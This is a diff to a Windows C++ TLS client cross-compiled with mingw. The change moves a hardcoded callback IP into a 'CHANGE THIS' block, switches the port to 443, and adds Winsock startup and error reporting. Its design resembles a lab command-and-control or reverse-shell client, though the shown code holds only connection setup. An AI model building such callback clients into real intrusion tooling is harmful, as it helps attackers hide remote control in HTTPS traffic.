@@ -1,5 +1,5 @@
 /*
-x86_64-w64-mingw32-g++ client.cpp -o client.exe -I/opt/openssl/include/ -L/opt/openssl/lib64/  -Wl,-Bstatic -lssl -lcrypto -Wl,-Bdynamic -lws2_32 -lcrypt32
+x86_64-w64-mingw32-g++ sourceCode/client.cpp -o client.exe -I/opt/openssl/include/ -L/opt/openssl/lib64/ -lssl -lcrypto -lws2_32 -lcrypt32
 */
 
 // windows headers
@@ -13,8 +13,16 @@ x86_64-w64-mingw32-g++ client.cpp -o client.exe -I/opt/openssl/include/ -L/opt/o
 #include <openssl/ssl.h>
 #include <openssl/err.h>
 
-// SSL functions
+////////////////// CHANGE THIS //////////////////
 
+char server_ip[16] = "192.168.56.3";    
+
+int port = 443;                       
+
+////////////////// CHANGE THIS //////////////////
+
+
+// SSL functions
 static SSL_CTX* create_context(){
 
     const SSL_METHOD *method;
@@ -59,11 +67,12 @@ int main(){
     size_t rxcap = sizeof(rxbuf);
     int rxlen;
 /////////////////////////////
-    char server_ip[16] = "192.168.56.3";    // CHANGE THIS 
-    int port = 4343;                        // CHANGE THIS 
 
     char message[40];
         int result ;
+
+
+    WSADATA wsaData;
 
     struct sockaddr_in ipInfo ;
     int addr_len = sizeof(ipInfo);
@@ -75,10 +84,20 @@ int main(){
 
     configure_client_context(ssl_ctx);
 
+    // Initialize WSA startup
+    int startupResult = WSAStartup(MAKEWORD(2,2), &wsaData);
+        if (startupResult != 0){
+            printf("[!] WSAStartup Failed...\n");
+            printf("[*] Reason: %i", WSAGetLastError());
+            WSACleanup();
+            exit(0);
+        }
+
     // Create our socket
-    int client = socket(2, 1, 6);  // socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
+    SOCKET client = socket(2, 1, 6);  // socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
         if(client < 0){
             printf("[!] Error creating socket! Result: %i\n", client);
+            printf("[*] Reason: %i\n", WSAGetLastError());
             exit(0);
         }
 
@@ -90,6 +109,7 @@ int main(){
     // Initalize the connection
     if(connect(client, (struct sockaddr*) &ipInfo, sizeof(ipInfo)) != 0){
         printf("[!] Unable to initalize TCP connection to the server...\n");
+        printf("[*] Reason: %i\n", WSAGetLastError());
         goto exit;
     }
     else{
